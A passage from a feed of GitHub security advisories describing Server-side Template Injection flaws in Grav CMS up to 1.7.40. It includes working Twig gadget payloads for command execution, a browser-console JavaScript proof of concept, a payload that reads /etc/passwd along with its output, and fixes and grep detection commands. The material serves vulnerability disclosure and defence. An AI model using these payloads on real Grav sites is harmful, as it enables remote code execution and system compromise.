href=\"https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5\">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>\n<li><a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190\">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190</a></li>\n<li><a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/</a></li>\n<li><a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j3v8-v77f-fvgm\">https://github.com/advisories/GHSA-j3v8-v77f-fvgm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j3v8-v77f-fvgm",
            "title": "[getgrav/grav] Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability",
            "date_modified": "2023-06-16T19:36:53.000Z",
            "date_published": "2023-06-16T19:36:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j3v8-v77f-fvgm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Hi,</p>\n<p>actually we have sent the bug report to <a href=\"mailto:security@getgrav.org\">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>\n<h1 id=\"grav-server-side-template-injection-ssti-via-insufficient-validation-in-filterfilter\">Grav Server-side Template Injection (SSTI) via Insufficient Validation in filterFilter</h1>\n<h2 id=\"summary\">Summary:</h2>\n<table>\n<thead>\n<tr>\n<th><strong>Product</strong></th>\n<th>Grav CMS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Vendor</strong></td>\n<td>Grav</td>\n</tr>\n<tr>\n<td><strong>Severity</strong></td>\n<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>\n</tr>\n<tr>\n<td><strong>Affected Versions</strong></td>\n<td>&lt;= <a href=\"https://github.com/getgrav/grav/tree/1.7.40\">v1.7.40</a> (Commit <a href=\"https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61\">685d762</a>) (Latest version as of writing)</td>\n</tr>\n<tr>\n<td><strong>Tested Versions</strong></td>\n<td>v1.7.40</td>\n</tr>\n<tr>\n<td><strong>Internal Identifier</strong></td>\n<td>STAR-2023-0007</td>\n</tr>\n<tr>\n<td><strong>CVE Identifier</strong></td>\n<td>TBD</td>\n</tr>\n<tr>\n<td><strong>CWE(s)</strong></td>\n<td>CWE-20: Improper Input Validation, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>\n</tr>\n</tbody></table>\n<h2 id=\"cvss31-scoring-system\">CVSS3.1 Scoring System:</h2>\n<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>\n<table>\n<thead>\n<tr>\n<th><strong>Metric</strong></th>\n<th><strong>Value</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Attack Vector (AV)</strong></td>\n<td>Network</td>\n</tr>\n<tr>\n<td><strong>Attack Complexity (AC)</strong></td>\n<td>Low</td>\n</tr>\n<tr>\n<td><strong>Privileges Required (PR)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>User Interaction (UI)</strong></td>\n<td>None</td>\n</tr>\n<tr>\n<td><strong>Scope (S)</strong></td>\n<td>Unchanged</td>\n</tr>\n<tr>\n<td><strong>Confidentiality (C)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Integrity (I)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Availability (A)</strong></td>\n<td>High</td>\n</tr>\n</tbody></table>\n<h2 id=\"product-overview\">Product Overview:</h2>\n<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>\n<h2 id=\"vulnerability-summary\">Vulnerability Summary:</h2>\n<p>There is a logic flaw in the <code>GravExtension.filterFilter()</code> function whereby validation against a denylist of unsafe functions is only performed when the argument passed to filter is a string. However, passing an array as a callable argument allows the validation check to be skipped. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.</p>\n<h2 id=\"vulnerability-details\">Vulnerability Details:</h2>\n<p>The vulnerability can be found in the <code>GravExtension.filterFilter()</code> function declared in <a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698\"><code>/system/src/Grav/Common/Twig/Extension/GravExtension.php</code></a>:</p>\n<pre><code class=\"language-php\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    \n    /**\n     * Return a list of all filters.\n     *\n     * @return array\n     */\n    public function getFilters(): array\n    {\n        return [\n            ...\n            \n            // Security fix\n            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),\n        ];\n    }\n\n    ...\n\n    /**\n     * @param Environment $env\n     * @param array $array\n     * @param callable|string $arrow\n     * @return array|CallbackFilterIterator\n     * @throws RuntimeError\n     */\n    function filterFilter(Environment $env, $array, $arrow)\n    {\n        if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) { // [1]\n            throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n        }\n\n        return \\twig_array_filter($env, $array, $arrow); // [2]\n    }\n}\n</code></pre>\n<p>At [1], the <code>$arrow</code> parameter contains the argument supplied to the filter. For example, it may refer to <code>\"funcname\"</code> in <code>{{ array|filter(\"funcname\") }}</code> or the closure (a.k.a. arrow function) <code>el =&gt; el != 'exclude'</code> in <code>{{ array|filter(el =&gt; el != 'exclude') }}</code>. Observe that <code>Utils::isDangerousFunction($arrow)</code> is only invoked if <code>$arrow</code> is a string. As such, non-string arguments may be passed to <code>twig_array_filter()</code> at [2] due to the absence of type enforcement at [1].</p>\n<p>The implementation of the <code>twig_array_filter()</code> function can be found in <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php\">/src/Extension/CoreExtension.php</a> within Twig's codebase:</p>\n<pre><code class=\"language-php\">function twig_array_filter(Environment $env, $array, $arrow)\n{\n    if (!twig_test_iterable($array)) {\n        throw new RuntimeError(sprintf('The \"filter\" filter expects an array or \"Traversable\", got \"%s\".', \\is_object($array) ? \\get_class($array) : \\gettype($array)));\n    }\n\n    if (!$arrow instanceof Closure &amp;&amp; $env-&gt;hasExtension('\\Twig\\Extension\\SandboxExtension') &amp;&amp; $env-&gt;getExtension('\\Twig\\Extension\\SandboxExtension')-&gt;isSandboxed()) { // [3]\n        throw new RuntimeError('The callable passed to \"filter\" filter must be a Closure in sandbox mode.');\n    }\n\n    if (\\is_array($array)) {\n        if (\\PHP_VERSION_ID &gt;= 50600) {\n            return array_filter($array, $arrow, \\ARRAY_FILTER_USE_BOTH); // [4]\n        }\n\n        return array_filter($array, $arrow);\n    }\n\n    // the IteratorIterator wrapping is needed as some internal PHP classes are \\Traversable but do not implement \\Iterator\n    return new \\CallbackFilterIterator(new \\IteratorIterator($array), $arrow);\n}\n</code></pre>\n<p>At [3], a runtime error is thrown if <code>$arrow</code> is not a closure and Twig sandbox is enabled. However, since Grav does not use the Twig Sandbox extension, the check passes successfully even when <code>$arrow</code> is not a closure. Subsequently at [4], <code>array_filter()</code> is invoked with the user-controlled <code>$array</code> input and <code>$arrow</code> parameter.</p>\n<p>Note that the method signature of <code>array_filter()</code> is as follows:</p>\n<pre><code class=\"language-php\">array_filter(array $array, ?callable $callback = null, int $mode = 0): array\n</code></pre>\n<p>A common mistake that developers make is assuming that the <code>callable</code> type refers to a <code>string</code> type. This is untrue, and it is <a href=\"https://www.php.net/manual/en/language.types.callable.php\">well documented in the PHP Manual</a>:</p>\n<blockquote>\n<p>A method of an instantiated object is passed as an <strong>array containing an object at index 0 and the method name at index 1</strong>. Accessing protected and private methods from within a class is allowed.\nStatic class methods can also be passed without instantiating an object of that class by either, <strong>passing the class name instead of an object at index 0, or passing <code>ClassName::methodName</code></strong>.</p>\n</blockquote>\n<p>This means that all of the following method calls are valid:</p>\n<pre><code class=\"language-php\">// Type 1: Simple callback -- invokes system(\"id\")\narray_filter(array(\"id\"), \"system\");\n\n// Type 2: Static class method call -- invokes Class::staticMethod($arg)\narray_filter(array($arg), array(\"Class\", \"staticMethod\"));\narray_filter(array($arg), array(\"Class::staticMethod\")); // same as above\n\n// Type 3: Object method call -- invokes $obj-&gt;method($arg)\narray_filter(array($arg), array($obj, \"method\"));\n</code></pre>\n<p>Going back to [1], if <code>$arrow</code> is an <code>array</code> instead of a <code>string</code> or <code>closure</code>, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Grav's codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:</p>\n<pre><code class=\"language-twig\">// Gadget 1: Using \\Grav\\Common\\Utils::arrayFilterRecursive() within Grav's codebase to invoke system(\"id\"):\n{% set id = {'id': 0} %}\n{{ {'system': id} | filter('\\\\Grav\\\\Common\\\\Utils', 'arrayFilterRecursive') }}\n\n// Gadget 2: Using \\Symfony\\Component\\VarDumper\\Vardumper::setHandler() and \\Symfony\\Component\\VarDumper\\Vardumper::dump() to invoke system(\"id\"):\n{{ ['system'] | filter(['\\\\Symfony\\\\Component\\\\VarDumper\\\\VarDumper', 'setHandler'])}}\n{{ ['id'] | filter(['\\\\Symfony\\\\Component\\\\VarDumper\\\\VarDumper', 'dump']) }}\n\n// Gadget 3: Using \\RocketTheme\\Toolbox\\File\\File::instance() in Grav's default theme to perform arbitrary file write to rce.php in the webroot:\n{{ (['rce.php'] | map(['\\\\RocketTheme\\\\Toolbox\\\\File\\\\File', 'instance']))[0].save('&lt;?php echo phpinfo(); ') }}\n\n// Gadget 4: Using \\Symfony\\Component\\Process\\Process::fromShellCommandline() to invoke system(\"id\"):\n{{ {'/':'sleep 3'} | map(['\\\\Symfony\\\\Component\\\\Process\\\\Process', 'fromShellCommandline']) | map(e =&gt; e.run()) | print_r }}\n</code></pre>\n<h2 id=\"exploit-conditions\">Exploit Conditions:</h2>\n<p>This vulnerability can be exploited if the attacker has access to:</p>\n<ol>\n<li>an administrator account, or</li>\n<li>a non-administrator, user account that are granted the following permissions:<ul>\n<li>login access to Grav admin panel, and</li>\n<li>page creation or update rights</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"reproduction-steps\">Reproduction Steps:</h2>\n<ol>\n<li>Log in to Grav Admin using an administrator account.</li>\n<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>\n<li>Login to Admin - Allowed</li>\n<li>Page Update - Allowed</li>\n</ul>\n</li>\n<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>\n<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>\n<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>\n<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class=\"language-twig\">// Gadget 1: Using \\Grav\\Common\\Utils::arrayFilterRecursive() within Grav's codebase to invoke system(\"id\"):\n{% set id = {'id': 0} %}\n{{ {'system': id} | filter('\\\\Grav\\\\Common\\\\Utils', 'arrayFilterRecursive') }}\n</code></pre>\n</li>\n<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>\n</ol>\n<h2 id=\"suggested-mitigations\">Suggested Mitigations:</h2>\n<p>Patch the logic flaw in the <code>GravExtension.filterFilter()</code> function declared in <code>/system/src/Grav/Common/Twig/Extension/GravExtension.php</code> to ensure that the <code>$arrow</code> paramater passed to the <code>filterFilter()</code> function must either be a <code>string</code> or an arrow function as such:</p>\n<pre><code class=\"language-diff\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n\n    /**\n     * @param Environment $env\n     * @param array $array\n     * @param callable|string $arrow\n     * @return array|CallbackFilterIterator\n     * @throws RuntimeError\n     */\n    function filterFilter(Environment $env, $array, $arrow)\n    {\n-       if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) {\n+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n            throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n        }\n\n        return \\twig_array_filter($env, $array, $arrow);\n    }\n}\n</code></pre>\n<p><code>Utils::isDangerousFunction()</code> in <a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074\">/system/src/Grav/Common/Utils.php</a> should also be patched to prevent static class methods from being invoked. For example,</p>\n<pre><code class=\"language-diff\">...\nabstract class Utils\n{\n    ...\n    /**\n     * @param string $name\n     * @return bool\n     */\n    public static function isDangerousFunction(string $name): bool\n    {\n        ...\n\n+       if (is_array($name) || strpos($name, \":\") !== false) {\n+           return false;\n+       }\n\n        if (in_array($name, $commandExecutionFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $codeExecutionFunctions)) {\n            return true;\n        }\n\n        if (isset($callbackFunctions[$name])) {\n            return true;\n        }\n\n        if (in_array($name, $informationDiscosureFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $otherFunctions)) {\n            return true;\n        }\n\n        return static::isFilesystemFunction($name);\n    }\n    ...\n}\n</code></pre>\n<p>End users should also ensure that <code>twig.undefined_functions</code> and <code>twig.undefined_filters</code> properties in <code>/path/to/webroot/system/config/system.yaml</code> configuration file are set to <code>false</code> to disallow Twig from treating undefined filters/functions as PHP functions and executing them.</p>\n<h2 id=\"detection-guidance\">Detection Guidance:</h2>\n<p>The following strategies may be used to detect potential exploitation attempts.</p>\n<ol>\n<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\(' /path/to/webroot/user/pages/</code></li>\n<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\('  --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>\n<li>Searching within Twig cache using the following shell command:<br><code>grep -Priz -e 'twig_array_(filter|map|reduce)' /path/to/webroot/cache/twig/</code></li>\n<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\(' /path/to/webroot/cache/compiled/files/</code></li>\n</ol>\n<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>\n<h2 id=\"credits\">Credits:</h2>\n<p>Ngo Wei Lin (<a href=\"https://twitter.com/Creastery\">@Creastery</a>) &amp; Wang Hengyue (<a href=\"https://twitter.com/w_hy_04\">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href=\"https://twitter.com/starlabs_sg\">@starlabs_sg</a>)</p>\n<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>\n<ol>\n<li><strong>CVE-2023-30595</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>GravExtension.filterFilter()</code> and to achieve remote code execution via usage of fully-qualified names, supplied as arrays of strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-96xv-rmwj-6p9w\">https://github.com/getgrav/grav/security/advisories/GHSA-96xv-rmwj-6p9w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34252\">https://nvd.nist.gov/vuln/detail/CVE-2023-34252</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec\">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b\">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8\">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5\">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>\n<li><a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698\">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698</a></li>\n<li><a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074\">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-96xv-rmwj-6p9w\">https://github.com/advisories/GHSA-96xv-rmwj-6p9w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-96xv-rmwj-6p9w",
            "title": "[getgrav/grav] Grav Server-side Template Injection (SSTI) via Twig Default Filters",
            "date_modified": "2023-06-16T19:36:39.000Z",
            "date_published": "2023-06-16T19:36:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-96xv-rmwj-6p9w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>I found an RCE(Remote Code Execution) by SSTI in the admin screen.</p>\n<h3 id=\"details\">Details</h3>\n<p>Remote Code Execution is possible by embedding malicious PHP code on the administrator screen by a user with page editing privileges.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Log in to the administrator screen and access the edit screen of the default page \"Typography\". (<code>http://127.0.0.1:8000/admin/pages/typography</code>)</li>\n<li>Open the browser's console screen and execute the following JavaScript code to confirm that an arbitrary command (<code>id</code>) is being executed.</li>\n</ol>\n<pre><code class=\"language-js\">(async () =&gt; {\n  const nonce = document.querySelector(\"input[name=admin-nonce]\").value;\n  const id = document.querySelector(\"input[name=__unique_form_id__]\").value;\n\n  const payload = \"{{['id']|map('system')|join}}\"; // SSTI Payload\n\n  const params = new URLSearchParams();\n  params.append(\"task\", \"save\");\n  params.append(\"data[header][title]\", \"poc\");\n  params.append(\"data[content]\", payload);\n  params.append(\"data[folder]\", \"poc\");\n  params.append(\"data[route]\", \"\");\n  params.append(\"data[name]\", \"default\");\n  params.append(\"data[header][body_classes]\", \"\");\n  params.append(\"data[ordering]\", 1);\n  params.append(\"data[order]\", \"\");\n  params.append(\"toggleable_data[header][process]\", \"on\");\n  params.append(\"data[header][process][twig]\", 1);\n  params.append(\"data[header][order_by]\", \"\");\n  params.append(\"data[header][order_manual]\", \"\");\n  params.append(\"data[blueprint\", \"\");\n  params.append(\"data[lang]\", \"\");\n  params.append(\"_post_entries_save\", \"edit\");\n  params.append(\"__form-name__\", \"flex-pages\");\n  params.append(\"__unique_form_id__\", id);\n  params.append(\"admin-nonce\", nonce);\n\n  await fetch(\"http://127.0.0.1:8000/admin/pages/typography\", {\n    method: \"POST\",\n    headers: {\n      \"content-type\": \"application/x-www-form-urlencoded\",\n    },\n    body: params,\n  });\n\n  window.open(\"http://127.0.0.1:8000/admin/pages/poc/:preview\");\n})();\n</code></pre>\n<h4 id=\"execution-result\">Execution Result</h4>\n<ul>\n<li>Payload: <code>{{['id']|map('system')|join}}</code></li>\n</ul>\n<pre><code class=\"language-sh\">uid=501(&lt;user_name&gt;) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae) uid=501(&lt;user_name&gt;) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)\n</code></pre>\n<ul>\n<li>Payload: <code>{{['cat /etc/passwd']|map('system')|join}}</code></li>\n</ul>\n<pre><code class=\"language-sh\">## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico _taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false _networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false _installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false _lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false _postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false _scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false _ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false _appstore:*:33:33:Mac App Store Service:/var/db/appstore:/usr/bin/false _mcxalr:*:54:54:MCX AppLaunch:/var/empty:/usr/bin/false _appleevents:*:55:55:AppleEvents Daemon:/var/empty:/usr/bin/false _geod:*:56:56:Geo Services Daemon:/var/db/geod:/usr/bin/false _devdocs:*:59:59:Developer Documentation:/var/empty:/usr/bin/false _sandbox:*:60:60:Seatbelt:/var/empty:/usr/bin/false _mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false _ard:*:67:67:Apple Remote Desktop:/var/empty:/usr/bin/false _www:*:70:70:World Wide Web Server:/Library/WebServer:/usr/bin/false _eppc:*:71:71:Apple Events User:/var/empty:/usr/bin/false _cvs:*:72:72:CVS Server:/var/empty:/usr/bin/false _svn:*:73:73:SVN Server:/var/empty:/usr/bin/false _mysql:*:74:74:MySQL Server:/var/empty:/usr/bin/false _sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false _qtss:*:76:76:QuickTime Streaming Server:/var/empty:/usr/bin/false _cyrus:*:77:6:Cyrus Administrator:/var/imap:/usr/bin/false _mailman:*:78:78:Mailman List Server:/var/empty:/usr/bin/false _appserver:*:79:79:Application Server:/var/empty:/usr/bin/false _clamav:*:82:82:ClamAV Daemon:/var/virusmails:/usr/bin/false _amavisd:*:83:83:AMaViS Daemon:/var/virusmails:/usr/bin/false _jabber:*:84:84:Jabber XMPP Server:/var/empty:/usr/bin/false _appowner:*:87:87:Application Owner:/var/empty:/usr/bin/false _windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false _spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false _tokend:*:91:91:Token Daemon:/var/empty:/usr/bin/false _securityagent:*:92:92:SecurityAgent:/var/db/securityagent:/usr/bin/false _calendar:*:93:93:Calendar:/var/empty:/usr/bin/false _teamsserver:*:94:94:TeamsServer:/var/teamsserver:/usr/bin/false _update_sharing:*:95:-2:Update Sharing:/var/empty:/usr/bin/false _installer:*:96:-2:Installer:/var/empty:/usr/bin/false _atsserver:*:97:97:ATS Server:/var/empty:/usr/bin/false _ftp:*:98:-2:FTP Daemon:/var/empty:/usr/bin/false _unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false _softwareupdate:*:200:200:Software Update Service:/var/db/softwareupdate:/usr/bin/false _coreaudiod:*:202:202:Core Audio Daemon:/var/empty:/usr/bin/false _screensaver:*:203:203:Screensaver:/var/empty:/usr/bin/false _locationd:*:205:205:Location Daemon:/var/db/locationd:/usr/bin/false _trustevaluationagent:*:208:208:Trust Evaluation Agent:/var/empty:/usr/bin/false _timezone:*:210:210:AutoTimeZoneDaemon:/var/empty:/usr/bin/false _lda:*:211:211:Local Delivery Agent:/var/empty:/usr/bin/false _cvmsroot:*:212:212:CVMS Root:/var/empty:/usr/bin/false _usbmuxd:*:213:213:iPhone OS Device Helper:/var/db/lockdown:/usr/bin/false _dovecot:*:214:6:Dovecot Administrator:/var/empty:/usr/bin/false _dpaudio:*:215:215:DP Audio:/var/empty:/usr/bin/false _postgres:*:216:216:PostgreSQL Server:/var/empty:/usr/bin/false _krbtgt:*:217:-2:Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _kadmin_admin:*:218:-2:Kerberos Admin Service:/var/empty:/usr/bin/false _kadmin_changepw:*:219:-2:Kerberos Change Password Service:/var/empty:/usr/bin/false _devicemgr:*:220:220:Device Management Server:/var/empty:/usr/bin/false _webauthserver:*:221:221:Web Auth Server:/var/empty:/usr/bin/false _netbios:*:222:222:NetBIOS:/var/empty:/usr/bin/false _warmd:*:224:224:Warm Daemon:/var/empty:/usr/bin/false _dovenull:*:227:227:Dovecot Authentication:/var/empty:/usr/bin/false _netstatistics:*:228:228:Network Statistics Daemon:/var/empty:/usr/bin/false _avbdeviced:*:229:-2:Ethernet AVB Device Daemon:/var/empty:/usr/bin/false _krb_krbtgt:*:230:-2:Open Directory Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _krb_kadmin:*:231:-2:Open Directory Kerberos Admin Service:/var/empty:/usr/bin/false _krb_changepw:*:232:-2:Open Directory Kerberos Change Password Service:/var/empty:/usr/bin/false _krb_kerberos:*:233:-2:Open Directory Kerberos:/var/empty:/usr/bin/false _krb_anonymous:*:234:-2:Open Directory Kerberos Anonymous:/var/empty:/usr/bin/false _assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false _coremediaiod:*:236:236:Core Media IO Daemon:/var/empty:/usr/bin/false _launchservicesd:*:239:239:_launchservicesd:/var/empty:/usr/bin/false _iconservices:*:240:240:IconServices:/var/empty:/usr/bin/false _distnote:*:241:241:DistNote:/var/empty:/usr/bin/false _nsurlsessiond:*:242:242:NSURLSession Daemon:/var/db/nsurlsessiond:/usr/bin/false _displaypolicyd:*:244:244:Display Policy Daemon:/var/empty:/usr/bin/false _astris:*:245:245:Astris Services:/var/db/astris:/usr/bin/false _krbfast:*:246:-2:Kerberos FAST Account:/var/empty:/usr/bin/false _gamecontrollerd:*:247:247:Game Controller Daemon:/var/empty:/usr/bin/false _mbsetupuser:*:248:248:Setup User:/var/setup:/bin/bash _ondemand:*:249:249:On Demand Resource Daemon:/var/db/ondemand:/usr/bin/false _xserverdocs:*:251:251:macOS Server Documents Service:/var/empty:/usr/bin/false _wwwproxy:*:252:252:WWW Proxy:/var/empty:/usr/bin/false _mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false _nearbyd:*:268:268:Proximity and Ranging Daemon:/var/db/nearbyd:/usr/bin/false _reportmemoryexception:*:269:269:ReportMemoryException:/var/db/reportmemoryexception:/usr/bin/false _driverkit:*:270:270:DriverKit:/var/empty:/usr/bin/false _diskimagesiod:*:271:271:DiskImages IO Daemon:/var/db/diskimagesiod:/usr/bin/false _logd:*:272:272:Log Daemon:/var/db/diagnostics:/usr/bin/false _appinstalld:*:273:273:App Install Daemon:/var/db/appinstalld:/usr/bin/false _installcoordinationd:*:274:274:Install Coordination Daemon:/var/db/installcoordinationd:/usr/bin/false _demod:*:275:275:Demo Daemon:/var/empty:/usr/bin/false _rmd:*:277:277:Remote Management Daemon:/var/db/rmd:/usr/bin/false _accessoryupdater:*:278:278:Accessory Update Daemon:/var/db/accessoryupdater:/usr/bin/false _knowledgegraphd:*:279:279:Knowledge Graph Daemon:/var/db/knowledgegraphd:/usr/bin/false _coreml:*:280:280:CoreML Services:/var/db/coreml:/usr/bin/false _sntpd:*:281:281:SNTP Server Daemon:/var/empty:/usr/bin/false _trustd:*:282:282:trustd:/var/empty:/usr/bin/false _mmaintenanced:*:283:283:mmaintenanced:/var/db/mmaintenanced:/usr/bin/false _darwindaemon:*:284:284:Darwin Daemon:/var/db/darwindaemon:/usr/bin/false _notification_proxy:*:285:285:Notification Proxy:/var/empty:/usr/bin/false _avphidbridge:*:288:288:Apple Virtual Platform HID Bridge:/var/empty:/usr/bin/false _biome:*:289:289:Biome:/var/db/biome:/usr/bin/false _backgroundassets:*:291:291:Background Assets Service:/var/empty:/usr/bin/false 